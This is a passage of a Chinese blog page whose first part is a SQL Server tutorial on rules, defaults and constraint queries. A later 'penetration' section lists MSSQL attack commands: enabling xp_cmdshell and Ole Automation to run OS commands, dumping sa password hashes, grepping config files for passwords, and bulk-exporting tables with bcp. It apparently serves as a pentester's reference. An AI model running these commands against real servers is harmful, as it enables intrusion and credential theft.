+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">AS</span> <span style="color:#ff636f">@</span><span style="color:#58a1dd">Age</span> <span style="color:#ff636f">&gt;</span> <span style="color:#a6be9d">18</span></span></span></code></pre></div><p>这里比较的是一个变量，不管被检查的列是什么值，这个值将用于替换@Age。因此在这个示例中，规则所绑定的任何列的值都必须大于18。</p>
+<p>到目前为止，只是创建了一个规则，但这个规则还没对任何表的任何列起作用，要激活这个规则需要使用一个存储过程：sp_bindrule。</p>
+<p>将规则Age18绑定到表person的person_age列：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">EXEC</span> <span style="color:#58a1dd">sp_bindrule</span> <span style="color:#a6be9d">&#39;Age18Rule&#39;</span>,<span style="color:#a6be9d">&#39;person.person_age&#39;</span>;</span></span></code></pre></div><p>此时，如果我们执行不满足规则的插入操作：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">insert</span> <span style="color:#ff636f">into</span> <span style="color:#58a1dd">person</span> <span style="color:#ff636f">values</span> (<span style="color:#a6be9d">&#39;绑定规则&#39;</span>,<span style="color:#a6be9d">17</span>)</span></span></code></pre></div><p>将返回如下报错信息：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>消息 <span style="color:#a6be9d">513</span>，级别 <span style="color:#a6be9d">16</span>，状态 <span style="color:#a6be9d">0</span>，第 <span style="color:#a6be9d">1</span> 行
+</span></span><span style="display:flex;"><span>列的插入或更新与先前的 <span style="color:#ff636f">CREATE</span> <span style="color:#ff636f">RULE</span> 语句所指定的规则发生冲突。该语句已终止。冲突发生于数据库 <span style="color:#a6be9d">&#39;Nx&#39;</span>，表 <span style="color:#a6be9d">&#39;dbo.person&#39;</span>，列 <span style="color:#a6be9d">&#39;person_age&#39;</span>。
+</span></span><span style="display:flex;"><span>语句已终止。</span></span></code></pre></div><p>很明显，规则已经生效。</p>
+<p>要特别注意的是，在绑定之前，规则与任何表，任何列都没有关系，因此在绑定的时候，第二个参数要加.指定表名与列名(tablename.column)。</p>
+<p><strong>解除绑定规则：</strong></p>
+<p>当我们需要在一个列上解除绑定规则的时候，只要执行sp_unbindrule</p>
+<p>删除刚才绑定的规则：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">EXEC</span> <span style="color:#58a1dd">sp_unbindrule</span> <span style="color:#a6be9d">&#39;person.person_age&#39;</span>;</span></span></code></pre></div><p>这时候，执行刚才的插入操作，就不会报错了。</p>
+<p><strong>删除规则：</strong></p>
+<p>如果希望将规则从数据库中彻底删除，那么可以在表中使用非常熟悉的DROP语法。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">DROP</span> <span style="color:#ff636f">RULE</span> <span style="color:#ff636f">&lt;</span><span style="color:#ff636f">rule</span> <span style="color:#58a1dd">name</span><span style="color:#ff636f">&gt;</span></span></span></code></pre></div><p>如删除刚才创建的那条规则：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">DROP</span><span style="color:#ff636f">`</span> <span style="color:#ff636f">`</span><span style="color:#ff636f">RULE</span><span style="color:#ff636f">`</span> <span style="color:#ff636f">`</span><span style="color:#58a1dd">Age18Rule</span></span></span></code></pre></div><p>####### 9.2、默认值</p>
+<p>默认值类似于DEFAULT。实际上默认值-DEFAULT约束的关系与规则-CHECK约束的关系差不多。区别在于它们被追加到表中的方式和对用户自定义数据类型的默认值(<strong>是对象，而不是约束</strong>)支持。</p>
+<p>定义默认值的语法和定义规则类似：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">CREATE</span> <span style="color:#ff636f">DEFAULT</span> <span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">default_name</span><span style="color:#ff636f">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">AS</span> <span style="color:#ff636f">&lt;</span><span style="color:#ff636f">default</span> <span style="color:#58a1dd">value</span><span style="color:#ff636f">&gt;</span></span></span></code></pre></div><p><strong>创建默认值：</strong></p>
+<p>因此，假设要为Age定义一个值为0的默认值:</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">CREATE</span> <span style="color:#ff636f">DEFAULT</span> <span style="color:#58a1dd">AgeDefault</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">AS</span> <span style="color:#a6be9d">0</span></span></span></code></pre></div><p><strong>绑定默认值：</strong></p>
+<p>同样，如果不绑定到一个对象上，则默认值是不起作用的。要绑定的话，使用存储过程sp_bindefault。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">EXEC</span> <span style="color:#58a1dd">sp_bindefault</span> <span style="color:#a6be9d">&#39;AgeDefault&#39;</span>,<span style="color:#a6be9d">&#39;person.person_age&#39;</span>;</span></span></code></pre></div><p>要从表中解决默认值的绑定，使用sp_unbindefault:</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#58a1dd">sp_unbindefault</span> <span style="color:#a6be9d">&#39;person.person_age&#39;</span>;</span></span></code></pre></div><p><strong>删除默认值：</strong></p>
+<p>如果要从数据库中彻底删除一个默认值，则可以使用DROP语法，与删除规则相同：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">DROP</span> <span style="color:#ff636f">DEFAULT</span> <span style="color:#58a1dd">AgeDefault</span></span></span></code></pre></div><p>####### 9.3确定哪个表和数据类型使用给定的规则或默认值</p>
+<p>如果希望删除或者修改规则或默认值。那么您可以先看看哪些表和数据类型在使用它们。SQL Server还是采用系统存储过程解决这个问题。这个存储过程是sp_depends。其语法如下所示：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">EXEC</span> <span style="color:#58a1dd">sp_depends</span> <span style="color:#ff636f">&lt;</span><span style="color:#ff636f">object</span> <span style="color:#58a1dd">name</span><span style="color:#ff636f">&gt;</span></span></span></code></pre></div><p>sp_depends提供了依赖于你所查询对象的所有对象列表。</p>
+<h6 id="十系统视图" class="heading-element"><span>0.0.0.1.12  十、系统视图</span>
+  <a href="#%e5%8d%81%e7%b3%bb%e7%bb%9f%e8%a7%86%e5%9b%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">--CHECK约束，数据来源sys.objects.type=&#39;C&#39;,
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">--兼容性视图SYSCONSTRAINTS
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">select</span> <span style="color:#ff636f">*</span>, ( <span style="color:#ff636f">select</span> <span style="color:#ff636f">c</span>.<span style="color:#58a1dd">name</span> <span style="color:#ff636f">from</span> <span style="color:#58a1dd">syscolumns</span> <span style="color:#ff636f">c</span> <span style="color:#ff636f">where</span> <span style="color:#ff636f">c</span>.<span style="color:#58a1dd">colid</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">t</span>.<span style="color:#58a1dd">parent_column_id</span> <span style="color:#ff636f">and</span> <span style="color:#ff636f">c</span>.<span style="color:#58a1dd">id</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">object_id</span>(<span style="color:#a6be9d">&#39;Mould&#39;</span>)) <span style="color:#ff636f">as</span> 列名
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">from</span>   <span style="color:#58a1dd">sys</span>.<span style="color:#58a1dd">check_constraints</span> <span style="color:#58a1dd">t</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">where</span>  <span style="color:#58a1dd">parent_object_id</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">object_id</span>(<span style="color:#a6be9d">&#39;Mould&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">--默认约束，数据来源sys.objects.type=D,
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">--兼容性视图SYSCONSTRAINTS
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">select</span> <span style="color:#ff636f">*</span>, ( <span style="color:#ff636f">select</span> <span style="color:#ff636f">c</span>.<span style="color:#58a1dd">name</span> <span style="color:#ff636f">from</span> <span style="color:#58a1dd">syscolumns</span> <span style="color:#ff636f">c</span> <span style="color:#ff636f">where</span> <span style="color:#ff636f">c</span>.<span style="color:#58a1dd">colid</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">t</span>.<span style="color:#58a1dd">parent_column_id</span> <span style="color:#ff636f">and</span> <span style="color:#ff636f">c</span>.<span style="color:#58a1dd">id</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">object_id</span>(<span style="color:#a6be9d">&#39;Mould&#39;</span>)) <span style="color:#ff636f">as</span> 列名
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">from</span>   <span style="color:#58a1dd">sys</span>.<span style="color:#58a1dd">default_constraints</span> <span style="color:#58a1dd">t</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">where</span>  <span style="color:#58a1dd">parent_object_id</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">object_id</span>(<span style="color:#a6be9d">&#39;Mould&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">--主键或唯一约束,数据来源sys.objects.type PK 和UQ,
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">--兼容性视图SYSCONSTRAINTS
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">select</span> <span style="color:#ff636f">*</span> <span style="color:#ff636f">from</span> <span style="color:#58a1dd">sys</span>.<span style="color:#58a1dd">key_constraints</span> <span style="color:#58a1dd">t</span> <span style="color:#ff636f">where</span> <span style="color:#58a1dd">parent_object_id</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">object_id</span>(<span style="color:#a6be9d">&#39;Mould&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">--外键，数据来源sys.object.type=F,
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">--兼容性视图SYSREFERENCES
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">select</span> <span style="color:#ff636f">*</span> <span style="color:#ff636f">from</span> <span style="color:#58a1dd">sys</span>.<span style="color:#58a1dd">foreign_keys</span> <span style="color:#58a1dd">t</span> <span style="color:#ff636f">where</span> <span style="color:#58a1dd">parent_object_id</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">object_id</span>(<span style="color:#a6be9d">&#39;Mould&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">--根据表名和列名查询列上的约束
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">select</span> <span style="color:#58a1dd">sysobjects</span>.<span style="color:#58a1dd">name</span>, <span style="color:#58a1dd">sysobjects</span>.<span style="color:#58a1dd">xtype</span>, <span style="color:#58a1dd">sysobjects</span>.<span style="color:#58a1dd">id</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">from</span>   <span style="color:#58a1dd">sysobjects</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#ff636f">join</span> <span style="color:#58a1dd">sysconstraints</span> <span style="color:#ff636f">on</span> <span style="color:#58a1dd">sysobjects</span>.<span style="color:#58a1dd">id</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">sysconstraints</span>.<span style="color:#58a1dd">constid</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">where</span>  <span style="color:#58a1dd">sysobjects</span>.<span style="color:#58a1dd">parent_obj</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">object_id</span>(<span style="color:#a6be9d">&#39;Mould&#39;</span>) <span style="color:#ff636f">and</span> <span style="color:#58a1dd">sysconstraints</span>.<span style="color:#58a1dd">colid</span> <span style="color:#ff636f">in</span> ( <span style="color:#ff636f">select</span> <span style="color:#58a1dd">colid</span> <span style="color:#ff636f">from</span> <span style="color:#58a1dd">syscolumns</span> <span style="color:#ff636f">where</span> <span style="color:#58a1dd">id</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">object_id</span>(<span style="color:#a6be9d">&#39;Mould&#39;</span>)  <span style="color:#ff636f">AND</span> <span style="color:#58a1dd">name</span> <span style="color:#ff636f">like</span>  <span style="color:#a6be9d">&#39;%&#39;</span> );</span></span></code></pre></div><h5 id="渗透" class="heading-element"><span>0.0.0.2  渗透</span>
+  <a href="#%e6%b8%97%e9%80%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><ul>
+<li><code>Mssql查找开放端口</code></li>
+</ul>
+<pre tabindex="0"><code>for /f &#34;tokens=2&#34; %i in (&#39;tasklist /FI &#34;SERVICES eq MSSQLSERVER&#34; /NH&#39;) do netstat -ano | findstr %i | findstr LISTENING</code></pre><ul>
+<li><code>Mssql开启xp_cmdshell</code></li>
+</ul>
+<pre tabindex="0"><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;</code></pre><ul>
+<li><code>Mssql关闭xp_cmdshell</code></li>
+</ul>
+<pre tabindex="0"><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 0;RECONFIGURE;</code></pre><ul>
+<li><code>Mssql xp_cmdshell执行命令</code></li>
+</ul>
+<pre tabindex="0"><code>EXEC master..xp_cmdshell &#34;whoami /user&#34;;</code></pre><ul>
+<li><code>Mssql开启SP_OACreate</code></li>
+</ul>
+<pre tabindex="0"><code>exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Ole Automation Procedures&#39;,1;RECONFIGURE;</code></pre><ul>
+<li><code>Mssql关闭SP_OACreate</code></li>
+</ul>
+<pre tabindex="0"><code>exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Ole Automation Procedures&#39;,0;RECONFIGURE;</code></pre><ul>
+<li><code>Mssql执行命令有回显-SP_OACreate</code></li>
+</ul>
+<pre tabindex="0"><code>declare @luan int,@exec int,@text int,@str varchar(8000);
+exec sp_oacreate &#39;{72C24DD5-D70A-438B-8A42-98424B88AFB8}&#39;,@luan output;
+exec sp_oamethod @luan,&#39;exec&#39;,@exec output,&#39;C:\\windows\\system32\\cmd.exe /c whoami&#39;;
+exec sp_oamethod @exec, &#39;StdOut&#39;, @text out;
+exec sp_oamethod @text, &#39;readall&#39;, @str out
+select @str;
+declare @test int,@exec int,@text int,@str varchar(8000);exec sp_oacreate &#39;{72C24DD5-D70A-438B-8A42-98424B88AFB8}&#39;,@test output;exec sp_oamethod @test,&#39;exec&#39;,@exec output,&#39;ipconfig /all&#39;;exec sp_oamethod @exec, &#39;StdOut&#39;, @text out;exec sp_oamethod @text, &#39;readall&#39;, @str out;select @str;--+</code></pre><ul>
+<li><code>Mssql执行命令无回显-SP_OACreate</code></li>
+</ul>
+<pre tabindex="0"><code>declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami &gt;C:\\Window\\Temp\\1.txt&#39;</code></pre><ul>
+<li>Mssql执行命令<code>sp_execute_external_script</code></li>
+</ul>
+<ol>
+<li>开启sp_execute_external_script</li>
+</ol>
+<pre tabindex="0"><code>EXECUTE sp_configure &#39;external scripts enabled&#39;, 1;RECONFIGURE;</code></pre><ol>
+<li>利用Python语言执行系统命令</li>
+</ol>
+<pre tabindex="0"><code>EXECUTE sp_execute_external_script
+@language =N&#39;Python&#39;,
+@script=N&#39;import subprocess;subprocess.call([&#34;whoami&#34;],shell=True)&#39;</code></pre><ol>
+<li>利用R语言执行系统命令</li>
+</ol>
+<pre tabindex="0"><code>EXECUTE sp_execute_external_script
+@language = N&#39;R&#39;,
+@script = N&#39;system(&#34;whoami&#34;)&#39;</code></pre><ul>
+<li><code>Mssql输出base64文件</code></li>
+</ul>
+<pre tabindex="0"><code>exec master..xp_cmdshell &#39;&gt;&gt;c:\windows\temp\vars.txt set /p=&#34;123456&#34; &lt;nul&#39;; //代替echo输出</code></pre><ul>
+<li><code>查看c盘下web.config文件</code></li>
+</ul>
+<pre tabindex="0"><code>findstr /c:&#34;User Id=&#34; /c:&#34;Password=&#34; /si web.config &gt;&gt; tmp.log
+findstr /c:&#34;uid=&#34; /c:&#34;Password=&#34; /si web.config &gt;&gt; tmp.log</code></pre><ul>
+<li><code>常SQL规工作组内网环境下的mssql实例</code></li>
+</ul>
+<pre tabindex="0"><code>PowerShell -Command &#34;[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()&#34;</code></pre><ul>
+<li><code>Mssql查询sa密码</code></li>
+</ul>
+<pre tabindex="0"><code>select name,password from syslogins  </code></pre><ul>
+<li><code>Mssql查询sa密码</code></li>
+</ul>
+<pre tabindex="0"><code>Select master.dbo.fn_varbintohexstr(password_hash) from sys.sql_logins where name = &#39;sa&#39; </code></pre><ul>
+<li><code>列出所有库</code></li>
+</ul>
+<pre tabindex="0"><code>SELECT name FROM MASTER..SysDatabases ORDER BY Name;--+
+SELECT NAME FROM MASTER.dbo.SysDatabases ORDER BY NAME;--+</code></pre><ul>
+<li><code>列出某个库所有表</code></li>
+</ul>
+<pre tabindex="0"><code>SELECT Name FROM [databasename]..SysObjects Where XType=&#39;U&#39; ORDER BY Name;--+</code></pre><ul>
+<li><code>列出表的字段</code></li>
+</ul>
+<pre tabindex="0"><code>SELECT TABLE_CATALOG,TABLE_NAME,COLUMN_NAME,DATA_TYPE from [databasename].information_schema.columns where TABLE_NAME = &#39;tablename&#39;;--+
+SELECT COLUMN_NAME,DATA_TYPE from [databasename].information_schema.columns where TABLE_NAME = &#39;tablename&#39;;--+</code></pre><ul>
+<li><code>varbinary数据类型hex编码</code></li>
+</ul>
+<pre tabindex="0"><code>SELECT TOP 2 sys.fn_varbintohexstr(pass),user FROM [dbo].[admin];--+</code></pre><ul>
+<li><code>xp_dirtree列目录</code></li>
+</ul>
+<pre tabindex="0"><code>exec master.dbo.xp_dirtree [c:\windows\],1,1;--+
+exec master.dbo.xp_dirtree &#39;c:\windows\&#39;,1,1;--+
+exec xp_subdirs &#34;C:\\WINDOWS\\&#34;</code></pre><ul>
+<li><code>写表读取本地文件</code></li>
+</ul>
+<pre tabindex="0"><code>CREATE TABLE temp (data varchar(2000));--+
+BULK INSERT dbo.temp FROM &#39;C:\Windows\System32\inetsrv\config\applicationHost.config&#39;;--+
+select * from dbo.temp;--+</code></pre><ul>
+<li><code>查询sqlserver数据库如何批量查询每个表前10条内容</code></li>
+</ul>
+<pre tabindex="0"><code>database=School
+
+DECLARE @table_name VARCHAR(MAX)
+DECLARE table_cursor CURSOR FOR
+    SELECT TABLE_NAME
+    FROM INFORMATION_SCHEMA.TABLES
+    WHERE TABLE_TYPE = &#39;BASE TABLE&#39;
+        AND TABLE_CATALOG = &#39;database=School&#39;
+
+OPEN table_cursor
+FETCH NEXT FROM table_cursor INTO @table_name
+
+WHILE @@FETCH_STATUS = 0
+BEGIN
+    DECLARE @sql_string VARCHAR(MAX)
+    SET @sql_string = &#39;SELECT TOP 1000 * FROM School.dbo.&#39; + @table_name
+
+    EXECUTE(@sql_string)
+
+    FETCH NEXT FROM table_cursor INTO @table_name
+END
+
+CLOSE table_cursor
+DEALLOCATE table_cursor</code></pre><ul>
+<li><code>查询sqlserver数据库如何批量查询每个表前10条内容,并备份为csv文件，我们可以利用bcp</code></li>
+</ul>
+<pre tabindex="0"><code>database=School
+==========================================================================================
+-T 表示使用 Trusted Connection。当使用 -T 参数时，bcp 将使用 Windows 身份验证来连接到 SQL Server。
+-S 指定要连接的 SQL Server 实例的名称。
+默认实例: MSSQLSERVER
+
+HOSTNAME=IIS85-CN
+实例名=SQLEXPRESS
+bcp &#34;SELECT name FROM School.sys.tables&#34; queryout C:\backup\tables.txt -c -t, -T -S IIS85-CN
+bcp &#34;SELECT name FROM School.sys.tables&#34; queryout C:\backup\tables.txt -c -t, -T -S IIS85-CN\SQLEXPRESS
+
+==========================================================================================
+bcp &#34;SELECT name FROM School.sys.tables&#34; queryout C:\backup\tables.txt -c -t, -S localhost -U sa -P admin
+
+==========================================================================================
+FOR /F %i IN (C:\backup\tables.txt) DO (
+  bcp &#34;SELECT TOP 10 * FROM School.dbo.%i&#34; queryout C:\backup\%i.csv -c -t, -S localhost -U sa -P admin
+)</code></pre></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" class="post-tag" title="Tags - 计算机基础">计算机基础</a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" class="post-tag" title="Tags - 数据库">数据库</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/owasp/sql%E6%B3%A8%E5%85%A5/117/" class="post-nav-item" rel="prev" title="SQL注入-Bypass"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>SQL注入-Bypass</a>
+      <a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/66/" class="post-nav-item" rel="next" title="Redis未授权">Redis未授权<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
